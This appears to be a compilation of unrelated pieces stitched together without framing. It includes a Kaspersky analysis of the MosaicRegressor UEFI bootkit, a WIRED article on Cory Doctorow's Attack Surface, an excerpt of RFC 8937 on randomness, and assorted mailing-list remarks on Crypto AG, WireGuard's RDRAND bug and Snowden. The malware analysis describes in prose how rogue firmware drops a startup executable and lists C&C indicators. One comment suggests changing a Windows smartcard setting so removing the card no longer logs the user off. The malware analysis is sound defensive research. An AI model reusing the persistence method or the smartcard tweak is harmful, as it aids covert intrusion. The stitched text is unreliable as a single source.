Further suggestions that he and/or his colleages might have cooperated with the intelligence services, are found in the [Operation RUBICON]( documents [8]( In 1993, shortly after release of [Crypto AG]( sales representative [Hans Bühler]( from an Iranian prison, 3 the Swiss Bundespolizei (BuPo) investigated the allegations that [Crypto AG equipment]( might have been rigged by foreign intelligence services. Swiss military officials subsequently informed the [CIA]( that they had:
"the ability to ensure that the official results of any
investigation will show no manipulation of the gear"
They also informed the [CIA]( that, should the investigation be subcontracted to the ETH in Zürich, they could handle four of the five cryptomathematicians who could become involved in the investigation. In other words: the ETH was in their pocket.

there is likely no long of the conversations, however. while IRC is definitely not *private*, it's also not inherently archived and indexed. (a feature? :)
the persistence and visibility of email, even mailing lists, leads to a different style of communication. like you see here. pick your mediums as wisely as you pick your peers! *grin*

MosaicRegressor: Lurking in the Shadows of UEFI
[Part II. Technical details (PDF)](
UEFI (or Unified Extensible Firmware Interface) has become a prominent technology that is embedded within designated chips on modern day computer systems. Replacing the legacy BIOS, it is typically used to facilitate the machine’s boot sequence and load the operating system, while using a feature-rich environment to do so. At the same time, it has become the target of threat actors to carry out exceptionally persistent attacks.
One such attack has become the subject of our research, where we found a compromised UEFI firmware image that contained a malicious implant. This implant served as means to deploy additional malware on the victim computers, one that we haven’t come across thus far. To the best of our knowledge, this is the second known public case where malicious UEFI firmware in use by a threat actor was found in the wild.
Throughout this blog we will elaborate on the following key findings:
- We discovered rogue UEFI firmware images that were modified from their benign counterpart to incorporate several malicious modules;
- The modules were used to drop malware on the victim machines. This malware was part of a wider malicious framework that we dubbed MosaicRegressor;
- Components from that framework were discovered in a series of targeted attacks pointed towards diplomats and members of an NGO from Africa, Asia and Europe, all showing ties in their activity to North Korea;
- Code artefacts in some of the framework’s components and overlaps in C&C infrastructure used during the campaign suggest that a Chinese-speaking actor is behind these attacks, possibly having connections to groups using the Winnti backdoor;
The attack was found with the help of [Firmware Scanner]( which has been integrated into Kaspersky products since the beginning of 2019. This technology was developed to specifically detect threats hiding in the ROM BIOS, including UEFI firmware images.
Current State of the Art
Before we dive deep into our findings, let us have a quick recap of what UEFI is and how it was leveraged for attacks thus far. In a nutshell, UEFI is a specification that constitutes the structure and operation of low-level platform firmware, so as to allow the operating system to interact with it at various stages of its activity.
This interaction happens most notably during the boot phase, where UEFI firmware facilitates the loading of the operating system itself. That said, it can also occur when the OS is already up and running, for example in order to update the firmware through a well-defined software interface.
Considering the above, UEFI firmware makes for a perfect mechanism of persistent malware storage. A sophisticated attacker can modify the firmware in order to have it deploy malicious code that will be run after the operating system is loaded. Moreover, since it is typically shipped within SPI flash storage that is soldered to the computer’s motherboard, such implanted malware will be resistant to OS reinstallation or replacement of the hard drive.
This type of attack has occurred in several instances in the past few years. A prominent example is the LowJax implant [discovered]( by our friends at ESET in 2018, in which patched UEFI modules of the LoJack anti-theft software (also known as Computrace) were used to deploy a malicious user mode agent in a number of Sofacy Fancy Bear victim machines. The dangers of Computrace itself [were described]( by our colleagues from the Global Research and Analysis Team (GReAT) back in 2014.
Another example is source code of a UEFI bootkit named VectorEDK which was discovered in the Hacking Team leaks from 2015. This code consisted of a set of UEFI modules that could be incorporated into the platform firmware in order to have it deploy a backdoor to the system which will be run when the OS loads, or redeploy it if it was wiped. Despite the fact that VectorEDK’s code was made public and [can be found]( in Github nowadays, we hadn’t witnessed actual evidence of it in the wild, before our latest finding.
Our Discovery
During an investigation, we came across several suspicious UEFI firmware images. A deeper inspection revealed that they contained four components that had an unusual proximity in their assigned GUID values, those were two DXE drivers and two UEFI applications. After further analysis we were able to determine that they were based on the leaked source code of HackingTeam’s VectorEDK bootkit, with minor customizations.
Rogue components found within the compromised UEFI firmware
The goal of these added modules is to invoke a chain of events that would result in writing a malicious executable named ‘IntelUpdate.exe’ to the victim’s Startup folder. Thus, when Windows is started the written malware would be invoked as well. Apart from that, the modules would ensure that if the malware file is removed from the disk, it will be rewritten. Since this logic is executed from the SPI flash, there is no way to avoid this process other than eliminating the malicious firmware.
Following is an outline of the components that we revealed:
- SmmInterfaceBase: a DXE driver that is based on Hacking Team’s ‘rkloader’ component and intended to deploy further components of the bootkit for later execution. This is done by registering a callback that will be invoked upon an event of type EFI_EVENT_GROUP_READY_TO_BOOT. The event occurs at a point when control can be passed to the operating system’s bootloader, effectively allowing the callback to take effect before it. The callback will in turn load and invoke the ‘SmmAccessSub’ component.
- Ntfs: a driver written by Hacking Team that is used to detect and parse the NTFS file system in order to allow conducting file and directory operations on the disk.
- SmmReset: a UEFI application intended to mark the firmware image as infected. This is done by setting the value of a variable named ‘fTA’ to a hard-coded GUID. The application is based on a component from the original Vector-EDK code base that is named ‘ReSetfTA’.
Setting of the fTA variable with a predefined GUID to mark the execution of the bootkit
- SmmAccessSub: the main bootkit component that serves as a persistent dropper for a user-mode malware. It is executed by the callback registered during the execution of ‘SmmInterfaceBase’, and takes care of writing a binary embedded within it as a file named ‘IntelUpdate.exe’ to the startup directory on disk. This allows the binary to execute when Windows is up and running.
This is the only proprietary component amongst the ones we inspected, which was mostly written from scratch and makes only slight use of code from a Vector-EDK application named ‘fsbg’. It conducts the following actions to drop the intended file to disk:
- Bootstraps pointers for the SystemTable, BootServices and RuntimeServices global structures.
- Tries to get a handle to the currently loaded image by invoking the HandleProtocol method with the EFI_LOADED_IMAGE_PROTOCOL_GUID argument.
- If the handle to the current image is obtained, the module attempts to find the root drive in which Windows is installed by enumerating all drives and checking that the ‘\Windows\System32’ directory exists on them. A global EFI_FILE_PROTOCOL object that corresponds to the drive will be created at this point and referenced to open any further directories or files in this drive.
- If the root drive is found in the previous stage, the module looks for a marker file named ‘setupinf.log’ under the Windows directory and proceeds only if it doesn’t exist. In the absence of this file, it is created.
- If the creation of ‘setupinf.log’ succeeds, the module goes on to check if the ‘Users’ directory exists under the same drive.
- If the ‘Users’ directory exists, it writes the ‘IntelUpdate.exe’ file (embedded in the UEFI application’s binary) under the ‘ProgramData\Microsoft\Windows\Start Menu\Programs\Startup’ directory in the root drive.
Code from ‘SmmAccessSub’ used to write the embedded ‘IntelUpdate.exe’ binary to the Windows Startup directory
Unfortunately, we were not able to determine the exact infection vector that allowed the attackers to overwrite the original UEFI firmware. Our detection logs show that the firmware itself was found to be malicious, but no suspicious events preceded it. Due to this, we can only speculate how the infection could have happened.
One option is through physical access to the victim’s machine. This could be partially based on Hacking Team’s leaked material, according to which the installation of firmware infected with VectorEDK requires booting the target machine from a USB key. Such a USB would contain a special update utility that can be generated with a designated builder provided by the company. We found a Q-flash update utility in our inspected firmware, which could have been used for such a purpose as well.
Furthermore, the leaks reveal that the UEFI infection capability (which is referred to by Hacking Team as ‘persistent installation’) was tested on ASUS X550C laptops. These make use of UEFI firmware by AMI which is very similar to the one we inspected. For this reason we can assume that Hacking Team’s method of patching the firmware would work in our case as well.
Excerpt from a Hacking Team manual for deployment of infected UEFI firmware, also known as ‘persistent installation’
Of course, we cannot exclude other possibilities whereby rogue firmware was pushed remotely, perhaps through a compromised update mechanism. Such a scenario would typically require exploiting vulnerabilities in the BIOS update authentication process. While this could be the case, we don’t have any evidence to support it.
The Bigger Picture: Enter MosaicRegressor Framework
While Hacking Team’s original bootkit was used to write one of the company’s backdoors to disk, known as ‘Soldier’, ‘Scout’ or ‘Elite’, the UEFI implant we investigated deployed a new piece of malware that we haven’t seen thus far. We decided to look for similar samples that share strings and implementation traits with the dropped binary. Consequently, the samples that we found suggested that the dropped malware was only one variant derived from a wider framework that we named MosaicRegressor.
MosaicRegressor is a multi-stage and modular framework aimed at espionage and data gathering. It consists of downloaders, and occasionally multiple intermediate loaders, that are intended to fetch and execute payload on victim machines. The fact that the framework consists of multiple modules assists the attackers to conceal the wider framework from analysis, and deploy components to target machines only on demand. Indeed, we were able to obtain only a handful of payload components during our investigation.
The downloader components of MosaicRegressor are composed of common business logic, whereby the implants contact a C&C, download further DLLs from it and then load and invoke specific export functions from them. The execution of the downloaded modules usually results in output that can be in turn issued back to the C&C.
Having said that, the various downloaders we observed made use of different communication mechanisms when contacting their C&Cs:
- CURL library (HTTP/HTTPS)
- BITS transfer interface
- WinHTTP API
- POP3S/SMTPS/IMAPS, payloads transferred in e-mail messages
The last variant in the list is distinct for its use of e-mail boxes to host the requested payload. The payload intended to run by this implant can also generate an output upon invocation, which can be later forwarded to a ‘feedback’ mail address, where it will likely be collected by the attackers.
The mail boxes used for this purpose reside on the ‘mail.ru’ domain, and are accessed using credentials that are hard-coded in the malware’s binary. To fetch the requested file from the target inbox, MailReg enters an infinite loop where it tries to connect to the “pop.mail.ru” server every 20 minutes, and makes use of the first pair of credentials that allow a successful connection. The e-mails used for login (without their passwords) and corresponding feedback mail are specified in the table below:
Login mail
Feedback mail
thtgoolnc at mail.ru
thgetmmun at mail.ru
thbububugyhb85 at mail.ru
thyhujubnmtt67 at mail.ru
The downloaders can also be split in two distinct types, the “plain” one just fetching the payload, and the “extended” version that also collects system information:
Structure of the log file written by BitsRegEx, strings marked in red are the original fields that appear in that file
We were able to obtain only one variant of the subsequent stage, that installs in the autorun registry values and acts as another loader for the components that are supposed to be fetched by the initial downloader. These components are also just intermediate loaders for the next stage DLLs. Ultimately, there is no concrete business logic in the persistent components, as it is provided by the C&C server in a form of DLL files, most of them temporary.
We have observed one such library, “load.rem“, that is a basic document stealer, fetching files from the “Recent Documents” directory and archiving them with a password, likely as a preliminary step before exfiltrating the result to the C&C by another component.
The following figure describes the full flow and connection between the components that we know about. The colored elements are the components that we obtained and gray ones are the ones we didn’t:
Flow from BitsRegEx to execution of intermediate loaders and final payload
Who were the Targets?
According to our telemetry, there were several dozen victims who received components from the MosaicRegressor framework between 2017 and 2019. These victims included diplomatic entities and NGOs in Africa, Asia and Europe. Only two of them were also infected with the UEFI bootkit in 2019, predating the deployment of the BitsReg component.
Based on the affiliation of the discovered victims, we could determine that all had some connection to the DPRK, be it non-profit activity related to the country or actual presence within it. This common theme can be reinforced through one of the infection vectors used to deliver the malware to some of the victims, which was SFX archives pretending to be documents discussing various subjects related to North Korea. Those were bundled with both an actual document and MosaicRegressor variants, having both executed when the archive is opened. Examples for the lure documents can be seen below.
Examples of lure documents bundled to malicious SFX archives sent to MosaicRegressor victims, discussing DPRK related topics
Who is behind the attack?
When analyzing MosaicRegressor’s variants, we noticed several interesting artefacts that provided us with clues on the identity of the actor behind the framework. As far as we can tell, the attacks were conducted by a Chinese-speaking actor, who may have previously used the Winnti backdoor. We found the following evidence to support this:
- We spotted many strings used in the system information log generated by the BitsRegEx variant that contain the character sequence ‘0xA3, 0xBE’. This is an invalid sequence for a UTF8 string and the LATIN1 encoding translates these symbols to a pound sign followed by a “masculine ordinal indicator” (“£º”). An attempt to iterate over all available iconv symbol tables, trying to convert the sequence to UTF-8, produces possible candidates that give a more meaningful interpretation. Given the context of the string preceding the symbol and line feed symbols following it, the best match is the “FULL-WIDTH COLON” Unicode character translated from either the Chinese or Korean code pages (i.e. CP936 and CP949).
Figure: The BitsRegEx system information log making use of the character sequence 0xA3, 0xBA, likely used to represent a full-width colon, according to code pages CP936 and CP949.
- Another artefact that we found was a file resource found in CurlReg samples that contained a language identifier set to 2052 (“zh-CN”)
Chinese language artefact in the resource section of a CurlReg sample
- We detected an OLE2 object taken out of a document armed with the CVE-2018-0802 vulnerability, which was produced by the so-called ‘Royal Road’ / ‘8.t’ document builder and used to drop a CurlReg variant. To the best of our knowledge, this builder is commonly used by Chinese-speaking threat actors.
Excerpt from the OLE2 object found within a ‘Royal Road’ weaponized document, delivering the CurlReg variant
- A C&C address (103.82.52[.]18) which was found in one of MosaicRegressor’s variants (MD5:3B58E122D9E17121416B146DAAB4DB9D) was observed in use by the ‘Winnti umbrella and linked groups’, according to a publicly available [report]( Since this is the only link between our findings and any of the groups using the Winnti backdoor, we estimate with low confidence that it is indeed responsible for the attacks.
The attacks described in this blog post demonstrate the length an actor can go in order to gain the highest level of persistence on a victim machine. It is highly uncommon to see compromised UEFI firmware in the wild, usually due to the low visibility into attacks on firmware, the advanced measures required to deploy it on a target’s SPI flash chip, and the high stakes of burning sensitive toolset or assets when doing so.
With this in mind, we see that UEFI continues to be a point of interest to APT actors, while at large being overlooked by security vendors. The combination of our technology and understanding of the current and past campaigns leveraging infected firmware, helps us monitor and report on future attacks against such targets.

Hello Karl!
It looks like your OpenSSL headers don't match what Tor expects during `configure`.
You can try updating your openssl-devel libraries, (sometimes called libssl, libcrypto, ssl-dev, etc. Check accordingly for your distro).
You can try building and linking against your own SSL, ala:
./Configure --prefix=/usr no-idea no-rc5 no-mdc2 zlib-dynamic threads shared
just remember to pass the right options to configure!
If neither of these work, let me know what OS distribution you're on, and what version is returned by `openssl version`, and I'll try to help...

His Writing Radicalized Young Hackers. Now He Wants to Redeem Them
Cory Doctorow’sLittle Brotherseries has been a young-adult sci-fi bible for teen hacktivists. But with the latest and darkest book in the trilogy, it’s all grown up.
SET THE FIRSTand last books in Cory Doctorow’s epic, three-bookLittle Brothercypherpunk saga side by side, and they read a bit like a creative writing master class on telling two starkly opposite stories from the same prompt. The common premise: Islamist terrorists bomb the Bay Bridge. Thousands die. The Department of Homeland responds by turning San Francisco into a fascist, total-surveillance police state. The protagonist, a digitally gifted, troublemaking teen, must decide how to respond.
In the firstLittle Brotherinstallment, which Doctorow published in 2008, the answer seemed righteously inevitable: The hero uses his hacker skills to fight back. Specifically, he and his plucky hacker friends figure out how to jailbreak their Xboxes and channel the video game consoles’ encrypted comms over the Tor network to create Xnet, a cheap, anonymous, surveillance-proof system for organizing protest and foiling the panopticon cops by injecting false data into their totalitarian schemes.
In Doctorow’s third work in the series,publishing this week and titled Attack Surface, the protagonist takes an altogether different path. And while that path threads through the same alternate-world timeline of events, it’s tinted with all the shades of gray that the world has accumulated in the dozen long years since the series’ first, wide-eyed story.
This time the hero—or antihero, more like—instead chooses to go work for the DHS. After all, she’s angry, itching to use her prowess in digital exploitation, and someone needs to help hunt these terrorists who actually knows what she’s doing. To get the job, she breaks into her friends’ Xnet system—it was riddled with hackable bugs, of course—and uses information cascade modeling to identify all of the resistance’s leaders, then serves up the map to the authorities. Not long after, she swaps her DHS job for a contract position in Iraq, where she uses those same tricks to identify insurgent leaders, hack their devices, find them, and target them for killing.
The money is very good, and it keeps getting better. She’s transferred to Mexico City, switches contractors, and becomes accustomed to flying first-class, room service in Japanese-themed hotels, and aged scotch on the corporate account. Eventually she finds her employer is offering her exploitation skills to a kleptocratic Eastern European government that’s using them to suppress a “color revolution”-style movement. To assuage her guilt, she starts helping the dissidents, too, building surveillance systems by day and advising idealistic young rebels on how to defeat them by night—even while knowing that they’re almost certainly doomed, that the technological terrain has put them at an impossible disadvantage.
InLittle Brother,the series’ first book, Doctorow’s narrator was the idealistic and ultimately naive crypto-rebel Marcus Yallow. InAttack Surface, the latest, it’s the realist, cynical, ethically compromised spy, Masha Maximow. But Doctorow doesn’t want the reader to choose between the two. He wants you to see yourself in both Marcus and Masha, equally, to live out his morality tale from both perspectives. And he argues that second perspective may be far more relatable: His latest book is designed not for the fresh-faced Marcuses who are still ethically unblemished, but for the far larger population of Mashas who have already made moral compromises in their tech careers—who already work at a privacy-invasive social media giant, an adtech firm, a surveillance contractor, or an intelligence agency.
“I want to reach people who are maybe belated Robert Oppenheimers, who are thinking about whether or not it's a good idea to be running this Manhattan Project to manipulate people or spy on people or control people,” Doctorow told WIRED in an interview last week ahead ofAttack Surface’s release. “If you found yourself in tech because you were excited by how much self-determination and power and pleasure you got from mastering technology, and then found your entire professional life devoted to ensuring that no one else ever felt that, this is the time for your moral reckoning.”
Doctorow’s goal isn’t to shame those readers, nor to absolve them. His message for all of those ethically compromised Mashas, he says, is that it’s not too late. “Now is the time to figure out which side of the struggle you're on,” he says. “The side of computers controlling us, or the side of computers giving us control.”
For the last 12 years, Doctorow'sLittle Brotherseries has inspired and influenced digital subversives from Aaron Swartz to Laura Poitras to Edward Snowden.PHOTOGRAPH: JUCO
THE FIRST PERSONto tell me aboutLittle Brotherwas John Gilmore, cofounder of the Electronic Frontier Foundation and of theoriginal Cypherpunks, the 1990s techno-libertarian group that coined the term. As we sat in a coffee shop in San Francisco’s Mission District on a rainy day in 2011, Gilmore talked me through the whole cypherpunk canon: Tim May’sCyphernomicon, Eric Hughes’ “Cypherpunks’ Manifesto,” and the legendary Cypherpunks Mailing List, which Gilmore had once hosted on his own server and whose archives he copied onto a USB drive for me on the spot. And by the way, had I heard about a very interesting young-adult fiction book about teens using crypto tools to take on the DHS?
By then, in fact,Little Brotherwas already a best seller and was quickly becoming required reading for a certain class of young, digital dissidents. When Nathan Freitas, today the director of the smartphone-focused privacy nonprofit Guardian Project, downloaded the ebook in 2008, he found that it captured his experience unlike anything he’d ever read before. “It was the world I had lived in since 9/11,” says Freitas, who at the time had left a job as a developer for mobile device firm Palm to become a pro bono security consultant, working on behalf of every underdog from protesters at the Republican National Convention to Tibetan monks demonstrating against Chinese rule.
Little Brotherquickly became the book Freitas tried to convince every young technologist to read, to recruit them into a more political use of cryptography and hacking. Over the following years he watched it grow into a kind of bible for the digital protest movement, a piece of science fiction that felt far more immediate and urgent than sci-fi’s hacker classics. “It was a call to action for people who then would reference it in the way that people used to referenceSnow CrashorNeuromancer,” Freitas says. “It was a kind of touchstone for this idea that ‘now it's serious, now the internet is connected to our lives and war and oppression and surveillance.’”

In 2009, Freitas putLittle Brotheron the reading list for a class he taught at New York University's Interactive Telecommunications Program. One of the graduate students in that NYU class was Harlo Holmes, who today serves as director of digital security at the Freedom of the Press Foundation,teaching activists and journalists how to combat surveillance.
Holmes says that reading Doctorow’s book changed her life. “There was nothing more fundamental to my particular origin story than the semester I spent in that class and readingLittle Brother,” Holmes says. “It informed my thoughts around how privacy should work, the interplay between movement activists, technology, and the law, and what you should look out for when inviting technologies into your life to do that movement building.” Holmes’ final project for Freitas’ class was a smartphone camera tool she called “A Bigger Brother,” which has since evolved intoInformacam, designed to pull in phone sensor data and embed it in images to prove the authenticity of photos taken by protesters, such as images documenting police violence.
In February 2013, Doctorow published anotherLittle Brotherbook titledHomeland. This sequel told the story of how Doctorow’s hero, Marcus Yallow, is given a USB drive full of scandalous, classified secrets from spy agencies—torture, drone strikes, mass surveillance—and has to decide how to make it all public without inflicting collateral damage on innocent lives, including his own.
The book featured an afterword from Aaron Swartz, the young hacktivist who had been criminally prosecuted for downloading a collection of academic papers from the paywalled repository JSTOR in the hopes of making them freely available. Just two months beforeHomeland’s release, facing years in prison,Swartz had committed suicide. His posthumous words resonated inHomeland’s pages: “The system is changing,” Swartz wrote. “Thanks to the Internet, everyday people can learn about and organize around an issue even if the system is determined to ignore it. Now, maybe we won’t win every time—this is real life, after all—but we finally have a chance.”
A month later, documentary filmmaker and journalist Laura Poitras was readingHomelandwhile exchanging PGP keys and encrypted emails about bombshell NSA documents with a source she knew only as “Citizenfour.” Poitraswrote in her journalthat the book “feels likes a mirror of the exact fucking reality I’m living in. National security leaks, detention, threat of death, key passing.”
A few months later, Poitras traveled to Hong Kong withGuardianjournalists Glenn Greenwald and Ewan MacAskill to meet Citizenfour, whose real name was Edward Snowden. She gave Snowden a copy ofHomeland. After the whistleblower and journalists had collaborated to publish the biggest leak of NSA secrets in history, Snowden took the book with him on his journey into exile in Russia. In her subsequent documentary about Snowden,Citizenfour, Doctorow’s book appears on the bedside table of his hotel room, next to a tangle of cables and piled laptops.
“That moment inCitizenfourwhere Snowden grabs a copy ofHomelandand sticks it in his go bag, that’s kind of the apotheosis of it right there,” Doctorow says. “That was the moment when I thought, in some tiny way, I have been part of the moral instruction of some part of the current generation of technologists. The idea that now, whenever someone sits down to make a choice—do I take power away from users or do I give it to them?—Little Brothermight be weighing on their conscience, that is an awesome responsibility and a source of incredible pride.”
Snowden himself says he's been reading Doctorow since his early twenties, long before Poitras handed him that copy of the secondLittle Brotherbook. "He is to me a radical idealist, because no matter how bad things get, his mind goes to the stories of cooperation and creation-sharing," Snowden wrote in a text message to WIRED. "When the traditional structures of oppression are up to no good, as was the case inLittle Brother, Cory doesn't reflexively indoctrinate young readers with platitudes on the inevitability of corruption. He helps them reimagine the limits of their own power."

DESPITE THE DARK-AS-TOMORROW’S-HEADLINESthemes at their core,Little BrotherandHomelandwere young-adult novels, a two-part teen radical’s primer.Attack Surface, by contrast, is for actual adults, Doctorow says. Not because it has more adult language, violence, or sex—Doctorow cut the only sex scene in the book from the final draft—but because it deals with the very adult problem of having lived an ethically imperfect life.
“The thing adults do is confront their moral legacy. They look back on what they've done and they think about their regrets,” Doctorow says. “The ongoing process of being an adult is having been corralled into compromises and then making sense of those compromises for yourself.”
Doctorow says the book is meant to stand alone for new readers—even non-techy, civilian observers on the sidelines of the crypto wars—but that it’s also meant to speak to the core, cypherpunk audience of the first twoLittle Brotherbooks. And that includes the ones who didn’t turn out to be the heroes of their own story. “A bunch of people who grew up readingLittle Brother, imagining that they would become revolutionaries, woke up one day and realized that they're not revolutionaries, that in fact they're helping to make things worse, that they're part of a system that harms people,” says Eva Galperin, alongtime digital activist and head of the Electronic Frontier Foundation’s Threat Lab. Galperin serves in part as the inspiration for Masha’s character—both hackers, fictional and nonfictional, were born in the Soviet Union but grew up in San Francisco with immigrant parents.
But Galperin sees Masha also in her idealistic friends who went to work for Facebook or Palantir or government agencies, vowing to change them from the inside but finding themselves changed instead. “This is a book for the people who realize that they've grown up and made a lot of compromises,” Galperin says, “and about how you turn back from that.”
Attack Surface at some points reads almost like an admission of regret from Doctorow himself. When Masha describes how easily she exploited and rolled up Marcus Yallow’s Xnet for the DHS or the limits of encryption in an era when spy agencies and their contractors have hoards of zero-day vulnerabilities they can use to hack their targets, the book seems to be walking back a degree of technological solutionism that has long since gone out of style. At times it seems to even flirt with defeatism, conceding that all the techniques that worked to stop mass surveillance in Little Brother become useless the instant a sophisticated adversary has identified you as a subject for targeted surveillance.
At one point, Doctorow writes in Masha’s voice about the hero of his earlier works in a passage that might also be read as Doctorow berating his past self:
“What I truly hated about Marcus Yallow, above all else, was this: He gave people hope when no hope was called for. He told them they could master their computers and their networks, communicate in private and in secret, form networks of mutual aid and use them to bring down the powerful and unjust. But I’ve been on the other side of the data center, I’ve seen how hard it is to cover your tracks, to be perfect in your opsec, to know who and what to trust, to write code that is flawless.”
But Doctorow says that the intention ofAttack Surfacewasn’t to swing in the other direction on the spectrum between “nerd triumphalism” and “nerd despair,” as he puts it. Instead, it’s to find a more nuanced middle ground, one that acknowledges that technology can win some battles, but that others must be won with human willpower and political struggle, sometimes with the aim of controlling technology’s most dangerous applications.
The title ofAttack Surfacecomes from thecybersecurity term for a target system’s exposure to exploitation: The more attack surfaces—external connections and inputs—the more vulnerable the system is to hacking. But Doctorow says he chose the title because he defines “attack surface” as the volatile edge where two systems meet. Those systems might be a hackable device and the internet, or technology and the law, or even technology and human beings, with each having the power to potentially exploit the other.
Those edges add up to a far more complex and unpredictable picture than the one Doctorow sketched inLittle Brother. The world ofAttack Surfaceis one where technology isn’t necessarily a force for good or evil, but where it has to be bent to the right cause by human ethics. “Technology is a tool that gives us space to make political change. Politics are a tool we use to open the space for making better technology,” one wise character summarizes near the end ofAttack Surface, lecturing both Marcus and Masha. “It’s like parallel parking: You go as far as you can in one direction, then back up and go as far as you can in the other.”
Across its three-book arc, theLittle Brothernow achieves something similar: After driving his car to the extremes of digital idealism, Doctorow has backed it up to the other extreme of digital pessimism. And in doing so, he’s carved out a space for himself to fit a far messier truth between the two.

‐‐‐‐‐‐‐ Original Message ‐‐‐‐‐‐‐
Wireguard uses entropy instructions like RDRAND directly, with no mixing. Even BSD and Linux know this is a bad idea.
As it turns out, WireGuard relies on RDRAND (when available) to generate new session IDs. The session IDs need to be unique, and WireGuard wants them not to be simple consecutive integers, so it pulls a pseudorandom value from RDRAND, compares it against its existing session ID list to make sure there's no collision, then assigns it to the session.
Read that last part again carefully—it makes sure there's no collision first. If an existing session has the same ID as the new number, WireGuard asks RDRAND for another "random" number, checks it for uniqueness, and so on. Since RDRAND on my system—and any non-microcode-updated Ryzen 3000 system—always returned 0xFFFFFFFF no matter what, that means infinite loop. Infinite loops in kernel code are bad; they introduce you to the value of the hardware reset button in a hurry.
at least wireguard is fast? :P

recall that one of the charges against Snowden was "hacking his superior's password". that of course sounded absurd, given the security controls in use at NSA. (E.g. smartcards and certificates)
turns out the "hacking passwords" was removing interactive authentication from the encrypted certificate. this was done for "integration & automation" purposes, but had the side benefit of letting Snowden masquerade with higher privs as desired...
(less fun than another conjecture: manipulating Windows smartcard sessions, e.g. setting scremoveoption to "No Action" instead of "Force Logoff"...)
that's not the most significant fact, merely a trivia.  so tell us james, what is this document?

James, what we consider "illegal" is not in the eyes of those in power. remember that the whole showdown between Gen. Hayden and HPSCI Roark was over the "reasonableness" standard regarding privacy.
the stance changed to "warrantless surveillance is *reasonable* in the context of anti-terror."
obviously we don't agree, but to claim this authorization was some watershed malfeasance is misguided.
we're still waiting on the supreme court to weigh in on this "reasonableness"...

RFC 8937
Randomness Improvements for Security Protocols
Randomness is a crucial ingredient for Transport Layer Security (TLS) and related security protocols. Weak or predictable "cryptographically secure" pseudorandom number generators (CSPRNGs) can be abused or exploited for malicious purposes. An initial entropy source that seeds a CSPRNG might be weak or broken as well, which can also lead to critical and systemic security problems. This document describes a way for security protocol implementations to augment their CSPRNGs using long-term private keys. This improves randomness from broken or otherwise subverted CSPRNGs.

Secure and properly implemented random number generators, or "cryptographically secure" pseudorandom number generators (CSPRNGs), should produce output that is indistinguishable from a random string of the same length. CSPRNGs are critical building blocks for TLS and related transport security protocols. TLS in particular uses CSPRNGs to generate several values, such as ephemeral key shares and ClientHello and ServerHello random values. CSPRNG failures, such as the Debian bug described in[[DebianBug]( can lead to insecure TLS connections. CSPRNGs may also be intentionally weakened to cause harm[[DualEC]( Initial entropy sources can also be weak or broken, and that would lead to insecurity of all CSPRNG instances seeded with them. In such cases where CSPRNGs are poorly implemented or insecure, an adversary, Adv, may be able to distinguish its output from a random string or predict its output and recover secret key material used to protect the connection.
This document proposes an improvement to randomness generation in security protocols inspired by the "NAXOS trick"[[NAXOS]( Specifically, instead of using raw randomness where needed, e.g., in generating ephemeral key shares, a function of a party's long-term private key is mixed into the entropy pool. In the NAXOS key exchange protocol, raw random value x is replaced by H(x, sk), where sk is the sender's private key. Unfortunately, as private keys are often isolated in Hardware Security Modules (HSMs), direct access to compute H(x, sk) is impossible. Moreover, some HSM APIs may only offer the option to sign messages using a private key, yet offer no other operations involving that key. An alternate, yet functionally equivalent construction, is needed.
The approach described herein replaces the NAXOS hash with a keyed hash, or pseudorandom function (PRF), where the key is derived from a raw random value and a private key signature. ImplementationsSHOULDapply this technique a) when indirect access to a private key is available and CSPRNG randomness guarantees are dubious or b) to provide stronger guarantees about possible future issues with the randomness. Roughly, the security properties provided by the proposed construction are as follows:
- If the CSPRNG works fine (that is, in a certain adversary model, the CSPRNG output is indistinguishable from a truly random sequence), then the output of the proposed construction is also indistinguishable from a truly random sequence in that adversary model.
- Adv with full control of a (potentially broken) CSPRNG and ability to observe all outputs of the proposed construction does not obtain any non-negligible advantage in leaking the private key (in the absence of side channel attacks).
- If the CSPRNG is broken or controlled by Adv, the output of the proposed construction remains indistinguishable from random, provided that the private key remains unknown to Adv.
This document represents the consensus of the Crypto Forum Research Group (CFRG).

[3.]( Wrapper](
The output of a properly instantiated CSPRNG should be indistinguishable from a random string of the same length. However, as previously discussed, this is not always true. To mitigate this problem, we propose an approach for wrapping the CSPRNG output with a construction that mixes secret data into a value that may be lacking randomness.
Let G(n) be an algorithm that generates n random bytes, i.e., the output of a CSPRNG. Define an augmented CSPRNG G' as follows. Let Sig(sk, m) be a function that computes a signature of message m given private key sk. Let H be a cryptographic hash function that produces output of length M. Let Extract(salt, IKM) be a randomness extraction function, e.g., HKDF-Extract[[RFC5869]( which accepts a salt and input keying material (IKM) parameter and produces a pseudorandom key of L bytes suitable for cryptographic use. It must be a secure PRF (for salt as a key of length M) and preserve uniformness of IKM (for details, see[[SecAnalysis]( LSHOULDbe a fixed length. Let Expand(k, info, n) be a variable-length output PRF, e.g., HKDF-Expand[[RFC5869]( that takes as input a pseudorandom key k of L bytes, info string, and output length n, and produces output of n bytes. Finally, let tag1 be a fixed, context-dependent string, and let tag2 be a dynamically changing string (e.g., a counter) of L' bytes. We require that L >= n - L' for each value of tag2.
The construction works as follows. Instead of using G(n) when randomness is needed, use G'(n), where
G'(n) = Expand(Extract(H(Sig(sk, tag1)), G(L)), tag2, n)
Functionally, this expands n random bytes from a key derived from the CSPRNG output and signature over a fixed string (tag1). See[Section 4]( details about how "tag1" and "tag2" should be generated and used per invocation of the randomness wrapper. Expand() generates a string that is computationally indistinguishable from a truly random string of n bytes. Thus, the security of this construction depends upon the secrecy of H(Sig(sk, tag1)) and G(L). If the signature is leaked, then security of G'(n) reduces to the scenario wherein randomness is expanded directly from G(L).
If a private key sk is stored and used inside an HSM, then the signature calculation is implemented inside it, while all other operations (including calculation of a hash function, Extract function, and Expand function) can be implemented either inside or outside the HSM.
Sig(sk, tag1) need only be computed once for the lifetime of the randomness wrapper andMUST NOTbe used or exposed beyond its role in this computation. Additional recommendations for tag1 are given in the following section.
SigMUSTbe a deterministic signature function, e.g., deterministic Elliptic Curve Digital Signature Algorithm (ECDSA)[[RFC6979]( or use an independent (and completely reliable) entropy source, e.g., if Sig is implemented in an HSM with its own internal trusted entropy source for signature generation.
Because Sig(sk, tag1) can be cached, the relative cost of using G'(n) instead of G(n) tends to be negligible with respect to cryptographic operations in protocols such as TLS (the relatively inexpensive computational cost of HKDF-Extract and HKDF-Expand dominates when comparing G' to G). A description of the performance experiments and their results can be found in[[SecAnalysis](
Moreover, the values of G'(n) may be precomputed and pooled. This is possible since the construction depends solely upon the CSPRNG output and private key.
[4.]( Generation](
